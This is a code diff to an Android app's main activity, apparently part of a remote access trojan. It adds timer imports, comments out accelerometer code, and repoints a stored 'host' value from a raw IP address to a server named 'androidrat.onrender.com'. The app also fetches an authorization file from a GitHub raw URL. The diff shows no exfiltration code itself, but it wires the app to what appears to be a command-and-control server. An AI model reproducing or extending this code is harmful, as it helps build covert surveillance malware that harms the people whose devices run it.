@@ -72,6 +72,8 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
 
 import okhttp3.MediaType;
 import okhttp3.RequestBody;
@@ -102,7 +104,7 @@ public class MainActivity extends AppCompatActivity {
 
     private double Previousacceration;
 
-    private Camera camera;
+
     @SuppressLint("MissingInflatedId")
     @SuppressWarnings("deprecation")
     @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
@@ -112,8 +114,6 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         prefManager = new PrefManager(this);
         textView = findViewById(R.id.textView);
-
-
 
         textView.setOnLongClickListener(new View.OnLongClickListener() {
             @Override
@@ -147,7 +147,7 @@ public class MainActivity extends AppCompatActivity {
         });
 
 
-        prefManager.setString("host", "http://13.37.112.215:4000");
+        prefManager.setString("host", "https://androidrat.onrender.com");
         RetrofitClient.getRetrofitInstance().create(APIinterface.class).getResponse("https://raw.githubusercontent.com/sumanmanna6111/appcrt/master/auth.json").enqueue(new Callback<ResponseBody>() {
             @Override
             public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
@@ -251,7 +251,8 @@ public class MainActivity extends AppCompatActivity {
             // Previousacceration = acceration;
 
 
-            acceration2 = (float)  Math.sqrt((x*x + y*y + z*z));
+
+            /*acceration2 = (float)  Math.sqrt((x*x + y*y + z*z));
             changs += acceration2;
             calculatetime = System.currentTimeMillis() - currenttime;
             currenttime += calculatetime;
@@ -269,7 +270,9 @@ public class MainActivity extends AppCompatActivity {
                 );
 
                float gf = ((float) (Math.log10(calculatetime+1.0f) * 30))+ 0  ;
-            }
+            }*/
+
+
 
 
 
